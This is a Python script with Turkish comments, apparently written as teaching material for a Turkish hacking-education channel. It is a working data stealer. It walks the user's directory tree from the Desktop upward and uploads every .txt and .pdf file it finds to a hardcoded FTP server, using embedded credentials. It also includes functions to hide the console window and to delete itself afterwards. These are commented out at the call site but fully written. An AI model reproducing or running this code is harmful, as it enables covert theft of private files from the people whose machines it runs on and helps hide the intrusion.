#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

import re,os,sys,platform           # Kullanacağımız modüller(kütüphaneler)
from ftplib import FTP              # FTP işlemleri için kütüphane


NerdeBasladik = os.getcwd()         # Başlanılan dizini tanımladık / Betik işini bitirince, betiği imha edeceğiz.
SistemKullaniciAdi = os.getlogin()  # Betiğin çalıştığı oturum ismini tanımladık / Dosyaları nerden aldığımızı bileceğiz.

FTP_Sunucu = "192.168.1.134"                            # FTP adresimizi tanımladık
FTP_Kullanıcı = "kekikakademi"                          # FTP kullanıcı adımızı tanımladık
FTP_Sifre = "kekik"                                     # FTP şifremizi tanımladık
FTPBaglantisi = FTP(FTP_Sunucu,FTP_Kullanıcı,FTP_Sifre) # FTP sunucumuza bağlandık


def WindowsTerminaliGizle(): # Windows'da betiği çalıştırdıktan sonra terminalin görünmez olması için metodumuz
    import win32console, win32gui
    Terminal = win32console.GetConsoleWindow()
    win32gui.ShowWindow(Terminal, 0)


Kullanici_Dizini = os.getenv("USERPROFILE") # Kullanıcının bulunduğu dizini tanımladık
print("\tİşte Sana Kullanıcı Dizini >> " + Kullanici_Dizini)

Calinacak_Dizin = Kullanici_Dizini + f"\\Desktop\\" # Kullanıcının masaüstünü tanımladık
print("\n\tAma Ben Artık Burdayım;")
print(Calinacak_Dizin)

Ayristirici = Calinacak_Dizin.split("\\") # Calinacak_Dizin yolunu, Windows için > "\\" ile ayrıştırarak listeye çevirdik. Linux için > "/"
print("\n\tİşte Bulunduğum Dizinin Listelenmiş Hali;")
print(Ayristirici)

print("\n\tTarama Başlıyor..\n")
os.chdir(Calinacak_Dizin) # Dizin değiştir, Calinacak_Dizin ile

sayi = len(Ayristirici) - 1 # Listenin sonuncu(boş) elemanını hikayeden çıkardık
for i in range(4, sayi):    # ['C:', 'Users', 'kekik', 'Desktop', ''] listesinden 3. olan desktop'ı tanımladık
    os.chdir(os.pardir)     # os.chdir() (change directory) ile dizin değiştirdik >> os.pardir (parent directory) bir üst dizin ile

Girilen_Dizinler = [] # Girilen Dizinler için boş liste oluşturduk

def BulunanDizin(Gelen_Dizin): # BulunanDizin metodumuz ve alınan Gelen_Dizin verisi
    os.chdir(Gelen_Dizin) # Dizin değiştir, Gelen_Dizin ile
    print("Bu Dizindeyim >> " + os.getcwd()) # Calinacak_Dizin + Gelen_Dizin
    Girilen_Dizinler.append(Gelen_Dizin) # Girilen_Dizinler listesine ekle, Gelen_Dizin'leri
    KontrolEt()
    os.chdir(os.pardir)

def KontrolEt(): # KontrolEt metodumuzu oluşturduk
    Dosyalar = os.listdir(os.getcwd()) # os.getcwd() (current working directory) şuan çalışılan dizindeki dosyaları(os.listdir) kayıt ettik
    for i in Dosyalar: # Kayıt edilen dosyalar for döngüsünde dökülür
        try: # try olası hatalar için
            if re.match(".*txt", i): # Eğer txt ile biten dosya varsa
                print("\t\n[+] " + SistemKullaniciAdi + "'de | Bunu Buldum >> " + i + "\n")
                FTPBaglantisi.storbinary('STOR ' + f"{SistemKullaniciAdi}_{i}", open(i, "rb")) # Döngüde yakalanan dosyayı al, başına "SistemKullaniciAdi_" ekleyerek FTP'ye yükle
            elif re.match(".*pdf", i): # Eğer pdf ile biten dosya varsa
                print("\t\n[+] " + SistemKullaniciAdi + "'de | Bunu Buldum >> " + i + "\n")
                FTPBaglantisi.storbinary('STOR ' + f"{SistemKullaniciAdi}_{i}", open(i, "rb")) # Döngüde yakalanan dosyayı al, başına "SistemKullaniciAdi_" ekleyerek FTP'ye yükle
            elif os.path.isdir(i): # i döngüsünde dosya yok ise (dizin ise)
                if Girilen_Dizinler.count(i) == 0: # Peki daha önce bu dizine girdik mi
                    BulunanDizin(i) # Girmediysek BulunanDizin metodunu çağır
                else: # Girilmişse
                    pass # Pas geç, girme bir daha 
            else: # Eğer eşleşen dosya yoksa
                pass # Boşver
        except Exception as HATA: # Hata var ise
            print("\n\t[!] Bir hata ile karşılaşıldı! [!]\n") # Hata Var
            print(HATA) # Tanımlanan hatayı ekrana yazdır
            sys.exit("\nBetik Kapatıldı!") # Betikten çıkış yap

def KendiniYokEt(): # Kendini imha etme metodumuz
    os.chdir(NerdeBasladik) # Dizin değiştir, başladığımız yer ile
    os.remove(sys.argv[0]) # Betiği imha et

# Betik Çalışmaya Başlasın!
#WindowsTerminaliGizle()
KontrolEt()
#KendiniYokEt()